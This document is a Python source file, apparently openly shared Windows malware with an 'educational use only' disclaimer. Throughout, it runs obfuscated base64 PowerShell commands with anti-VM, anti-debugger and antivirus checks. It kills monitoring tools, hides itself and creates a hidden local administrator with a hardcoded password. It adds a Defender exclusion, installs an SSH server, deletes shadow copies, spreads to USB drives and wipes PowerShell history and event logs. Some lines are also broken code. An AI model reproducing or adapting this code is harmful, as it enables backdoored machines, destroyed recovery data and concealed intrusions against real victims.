from time import time       # -Creator: I-DoNt-LiKe-Micro-Soft
start_time = time()         # -Github: https://github.com/I-DoNt-LiKe-Micro-Soft
from os import name         # -Python(3.11)
from sys import exit        # EDUCATIONAL USE ONLY, THIS FILE MUST NOT BE USED FOR MALICIOUS PURPOSES OR EXECUTED ON SOMEONES COMPUTER WITHOUT THEIR CONSENT!
from re import search       # THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES OR MISUSE OF THIS SOFTWARE!
from subprocess import run as XaWyjqOpBdJsaywqZxVv
from ctypes import windll
from base64 import b64decode as XaWyjqpBdJsaywqZxVv
from sys import argv
from ctypes import byref
from binascii import unhexlify as XaWyjqpBdJsdZaywqZxVv
from os import path
from os import environ
from os import remove
from os import mkdir
from shutil import move
from platform import release
from shutil import copy

def zqtapptushbvm(UserInput):
    Data = XaWyjqpBdJsaywqZxVv(UserInput.encode("utf-8"))
    return Data.decode("utf-8")

def qtauipricnzmkeya(UserInput):
    Data = XaWyjqpBdJsdZaywqZxVv(UserInput.encode("utf-8"))
    return Data.decode("utf-8")

class AntiAnalysis:
    def __init__(self):
        self.XaWyjqOpaBdJsaywqZxVv = XaWyjqOpBdJsaywqZxVv(
            zqtapptushbvm("UG9XZVJzSGVMbCBwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuYyAnWndCRkFIUUFMUUJ0QUZBQVl3QlBBRzBBVUFCMUFGUUFaUUJ5QUZNQWRBQmhBSFFBVlFCekFBPT0n"),
            shell=True, capture_output=True).stdout.decode()
        from ctypes import c_bool
        self.XaWyjqOpaBdxJsaywqZxVv = c_bool(False)

    def WARNING(self):
        match windll.user32.MessageBoxW(0, qtauipricnzmkeya("596f7520686176652065786563757465642061207669727573212e20436f6e74696e75653f207965732f6e6f"), "Info", 0x03):
            case 2:
                exit(1)
            case 7:
                exit(1)
                
    def OperatingSystemCheck(self):
        from os import name
        match name:
            case "nt":
                pass
            case "posix":
                exit(1)
            case _:
                exit(1)
                
    def ReleaseCheck(self):
        match release():
            case "10":
                pass
            case "11":
                windll.user32.MessageBoxW(0, zqtapptushbvm("VGhpcyBhcHBsaWNhdGlvbiBpcyBvbmx5IGF2YWxpYWJsZSBmb3Igd2luZG93cy0xMCBvcGVyYXRpbmcgc3lzdGVtcy4="),
                                          "Error", 0x10), exit(1)
            case _:
                exit(1)
                
    def VirtualMachineCheck(self):
        if search(zqtapptushbvm("SXNWaXJ0dWFsTWFjaGluZSAgICAgICAgICAgICAgICAgOiBUcnVl"), self.XaWyjqOpaBdJsaywqZxVv): exit(1)

    def DebuggerCheck(self):
        windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), byref(self.XaWyjqOpaBdxJsaywqZxVv))
        if self.XaWyjqOpaBdxJsaywqZxVv == True: exit(1)

    def RealTimeProtectionCheck(self):
        if search(zqtapptushbvm("UmVhbFRpbWVQcm90ZWN0aW9uRW5hYmxlZCAgICAgICAgOiBUcnVl"), self.XaWyjqOpaBdJsaywqZxVv): windll.user32.MessageBoxW(0,
                                                                                                           zqtapptushbvm("UmVhbCB0aW1lIHByb3RlY3Rpb24gbXVzdCBiZSBkaXNhYmxlZCB0byBpbnN0YWxsIGRlcGVuZGVuY2llcy4="),
                                                                                                           "Error",
                                                                                                           0x10), exit(1)

    def IsUsrAdmin(self):
        from sys import executable
        if not windll.shell32.IsUserAnAdmin(): windll.shell32.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None), exit(1)

    def MonitorKill(self):
        XaWyjqOpBdJsaywqZxVv("PowerShell stop-process -Name ProcMon64; stop-process -Name ProcessHacker; Stop-Process -Name Taskmgr")

class HideOutCreation:
    def __init__(self):
        self.hideoutpath = environ['temp'] + "\\.0193"
        self.MYCURRENTLOCATION = path.basename(argv[0])

    def PathCreation(self):
        if path.exists(self.hideoutpath) == False: mkdir(self.hideoutpath)
        windll.kernel32.SetFileAttributesW(self.hideoutpath, 2)

    def Hiding(self):
        if path.exists(self.hideoutpath + "\\" + self.MYCURRENTLOCATION): remove(
            self.hideoutpath + "\\" + self.MYCURRENTLOCATION)
        move(self.MYCURRENTLOCATION, self.hideoutpath + "\\" + self.MYCURRENTLOCATION)


def Logging():
    from socket import gethostname
    HOSTNAME = gethostname()
    HOSTNAMESTRING = HOSTNAME
    with open(environ['temp'] + "\\.0193\\Log.txt", "w") as LogFile:
        from time import strftime
        from time import gmtime
        LogFile.write("Date of execution(GMT): " + strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime()) + "\n")
        LogFile.write("Hostname: " + HOSTNAMESTRING + "\n")
        LogFile.write("Username: " + environ['username'] + "\n")
        from platform import architecture
        LogFile.write("Architecture: " + architecture()[0] + "\n")
        from platform import processor
        LogFile.write("Processor: " + processor() + "\n")
        from platform import system
        LogFile.write("System: " + system() + "\n")
        from platform import platform
        LogFile.write("Platform: " + platform() + "\n")
        LogFile.write("Release: " + release() + "\n")
        from platform import version
        LogFile.write("Version: " + version() + ", " + version().split('.')[2] + "\n")
        from platform import machine
        LogFile.write("Machine: " + machine() + "\n")
        from platform import win32_edition
        LogFile.write("Edition: " + win32_edition() + "\n")
        LogFile.close()


def HidingNewAdmin():
    from winreg import CreateKey
    from winreg import HKEY_LOCAL_MACHINE
    KEY = CreateKey(HKEY_LOCAL_MACHINE,
                    zqtapptushbvm("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHNcXFVzZXJMaXN0"))
    from winreg import SetValueEx
    from winreg import REG_DWORD
    SetValueEx(KEY, qtauipricnzmkeya("64656661756c747573657230"), 0, REG_DWORD, 0)
    KEY.Close()

def Payload():
    XaWyjqOpBdJsaywqZxVv(zqtapptushbvm("cE9XZVJzSGVsTCBwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuYyAnWVFCRUFHUUFMUUJ0QUZBQWNBQlNBR1VBUmdCbEFGSUFaUUJPQUdNQVJRQWdBQzBBWlFCWUFHTUFUQUIxQUZNQWFRQlBBRTRBY0FCQkFIUUFTQUFnQUNRQVpRQnVBSFlBT2dCMEFEOEFQd0J3QUE9PSc="),
        shell=True)
    # The base64 encoded run command above adds an exclusion to the temp folder using powershell..
    XaWyjqOpBdJsaywqZxVv(zqtapptushbvm("cG9XZVJzSGVMbCBwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuYyAnWVFCRUFHUUFMUUIzQUVrQWJnQkVBRzhBZHdCVEFHTUFZUUJRQUdFQVlnQnBBR3dBYVFCVUFIa0FJQUF0QUU4QWJnQk1BR2tBVGdCbEFDQUFMUUJ1QUVFQWJRQkZBQ0FBYndCd0FFVUFiZ0JUQUhNQVNBQXVBSE1BWlFCeUFIWUFaUUJ5QUg0QWZnQitBSDRBTUFBdUFEQUFMZ0F4QUM0QU1BQTdBQ0FBY3dCRkFIUUFMUUJ6QUVVQWNnQldBR2tBUXdCbEFDQUFMUUJ1QUVFQWJRQkZBQ0FBVXdCekFFZ0FaQUFnQUMwQWN3QlVBR0VBY2dCVUFIVUFVQUIwQUZrQWNBQkZBQ0FBSWdCaEFGVUFkQUJQQUcwQVFRQjBBRWtBWXdBaUFEc0FJQUJ6QUZRQVlRQlNBSFFBTFFCekFFVUFjZ0JXQUdrQVF3QmxBQ0FBY3dCVEFHZ0FSQUE9Jw=="),shell=True)
    # The base64 encoded run command above installs ssh server, starts ssh server and enables automatic ssh server startup using powershell.
    XaWyjqOpBdJsaywqZxVv(zqtapptushbvm("UE93RXJzSGVsTCBwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuYyAnSkFCUUFHRUFjd0J6QUZjQWJ3QnlBR1FBSUFBOUFDQUFRd0J2QUc0QWRnQmxBSElBZEFCVUFHOEFMUUJUQUdVQVl3QjFBSElBWlFCVEFIUUFjZ0JwQUc0QVp3QWdBRkFBWVFCekFITUFWd0F3QUhJQVpBQXhBRUFBSUFBdEFFRUFjd0JRQUd3QVlRQnBBRzRBVkFCbEFIZ0FkQUFnQUMwQVJnQnZBSElBWXdCbEFEc0FJQUJPQUdVQWR3QXRBRXdBYndCakFHRUFiQUJWQUhNQVpRQnlBQ0FBTFFCT0FHRUFiUUJsQUNBQVpBQmxBR1lBWVFCMUFHd0FkQUIxQUhNQVpRQnlBREFBSUFBdEFGQUFZUUJ6QUhNQWR3QnZBSElBWkFBZ0FDUUFVQUJoQUhNQWN3QlhBRzhBY2dCa0FEc0FJQUJCQUdRQVpBQXRBRXdBYndCakFHRUFiQUJIQUhJQWJ3QjFBSEFBVFFCbEFHMEFZZ0JsQUhJQUlBQXRBRWNBY2dCdkFIVUFjQUFnQUNJQVFRQmtBRzBBYVFCdUFHa0Fjd0IwQUhJQVlRQjBBRzhBY2dCekFDSUFJQUF0QUUwQVpRQnRBR0lBWlFCeUFDQUFaQUJsQUdZQVlRQjFBR3dBZEFCMUFITUFaUUJ5QURBQSc="),
        shell=True)
    # The base64 encoded run command above creates a new local admin with the username defaultuser0 and the password PassW0rd1@ using powershell.
    XaWyjqOpBdJsaywqZxVv(zqtapptushbvm("UG93RXJTaGVMbCBwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUVuYyAnZGdCekFITUFZUUJrQUcwQWFRQnVBQzRBWlFCNEFHVUFJQUJrQUVVQWJBQkZBSFFBUlFBZ0FITUFTQUJoQUVRQWJ3QlhBSE1BSUFBdkFHRUFUQUJzQUNBQUx3QnhBRlVBU1FCbEFGUUEn"),
        shell=True)
    # The base64 encoded run command above removes shadow copies using powershell.
    # -DevNote- Remove the safeboot/secureboot reg key.


class UsbDropper:
    def __init__(self):
        self.DRIVELETTERS = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:",
                             "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "Y:", "X:", "Z:"]
        self.CURRENTHOMEDRIVE = environ["HomeDrive"]  # -Returns HomeDrive windows-10 environment variable
        self.CURRENTSYSTEMDRIVE = environ["SystemDrive"]  # -Returns SystemDrive windows-10 environment variable
        self.MYCURRENTLOCATION = path.basename(argv[0])  # -Returns the name of the current file

    def usbdropper(self):
        if self.CURRENTSYSTEMDRIVE == self.CURRENTHOMEDRIVE:
            self.DRIVELETTERS.remove(self.CURRENTSYSTEMDRIVE)
        else:
            self.DRIVELETTERS.remove(self.CURRENTSYSTEMDRIVE)
            self.DRIVELETTERS.remove(self.CURRENTHOMEDRIVE)
        for Drives in self.DRIVELETTERS:
            try:
                copy(self.MYCURRENTLOCATION, Drives + "\\" + self.MYCURRENTLOCATION)
            except FileNotFoundError:
                pass
            
class FileDownloader:
    def __init__(self):
        self.ExecutableName = "python-3.11.3-amd64.exe"
        self.Url = "https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe"
        self.DownloadPath = environ["temp"]

    def Dropper(self):
        run("PowerShell Invoke-Webrequest " + self.Url + " -OutFile " + self.DownloadPath + "\\" + self.ExecutableName, shell=True)
    
    def Executor(self):
        run("powershell.exe Start-Process " + self.DownloadPath + "\\" + self.ExecutableName + " -Verb runAs", shell=True)

def ClearPsCommandHistory():
    XaWyjqOpBdJsaywqZxVv(qtauipricnzmkeya("704f5745527348656c4c20706f7765727368656c6c2e657865202d4e6f50202d4e6f6e49202d572048696464656e202d4578656320427970617373202d456e6320275567426c4147304162774232414755414c51424a414851415a514274414341414b41424841475541644141744146414155774253414755415951426b414777416151427541475541547742774148514161514276414734414b514175414567416151427a414851416277427941486b4155774268414859415a514251414745416441426f41413d3d27"),
        shell=True)
    # The base64 encoded run command above deletes the powershell command history file using powershell.


def ClearingEventViewer():
    XaWyjqOpBdJsaywqZxVv(qtauipricnzmkeya("506f5765527348456c4c20706f7765727368656c6c2e657865202d4e6f50202d4e6f6e49202d572048696464656e202d4578656320427970617373202d456e6320275277426c414851414c51425841476b4162674246414859415a5142754148514149414174414577416151427a414851415441427641476341494141714143414166414167414863416141426c414849415a514167414873414a414266414334415567426c41474d41627742794147514151774276414855416267423041483041494142384143414152674276414849415251426841474d416141417441453841596742714147554159774230414341414c514251414849416277426a414755416377427a4143414165774167414673415577423541484d416441426c414730414c67424541476b415951426e414734416277427a414851416151426a41484d414c674246414859415a5142754148514161514275414763414c674253414755415951426b4147554163674175414555416467426c414734416441424d414738415a774254414755416377427a41476b4162774275414630414f6741364145634162414276414749415951427341464d415a51427a41484d4161514276414734414c674244414777415a5142684148494154414276414763414b41416b414638414c67424d414738415a77424f414745416251426c41436b414941423941413d3d27"),
        shell=True)
    # The base64 encoded run command above deletes the event viewer logs.


def main():
    ANTIANALYSIS = AntiAnalysis()
    ANTIANALYSIS.OperatingSystemCheck()
    ANTIANALYSIS.ReleaseCheck()
    ANTIANALYSIS.WARNING()
    ANTIANALYSIS.VirtualMachineCheck()
    ANTIANALYSIS.DebuggerCheck()
    ANTIANALYSIS.RealTimeProtectionCheck()
    ANTIANALYSIS.IsUsrAdmin()
    ANTIANALYSIS.MonitorKill()
    del(ANTIANALYSIS)
    HIDEOUTCREATION = HideOutCreation()
    HIDEOUTCREATION.PathCreation()
    HIDEOUTCREATION.Hiding()
    del(HIDEOUTCREATION)
    from threading import Thread
    LOGGINGTHREAD = Thread(target=Logging())
    LOGGINGTHREAD.start()
    HidingNewAdmin()
    LOGGINGTHREAD.join()
    del(LOGGINGTHREAD)
    Payload()
    USBDROPPER = UsbDropper()
    USBDROPPER.usbdropper()
    del(USBDROPPER)
    DROPPER = FileDownloader()
    DROPPER.Dropper()
    DROPPER.Executor()
    del(DROPPER)
    ClearPsCommandHistory()
    ClearingEventViewer()


if __name__ == "__main__": main()

windll.user32.MessageBoxW(0,print("--- %s seconds ---"% (time() - start_time)), 0x40)
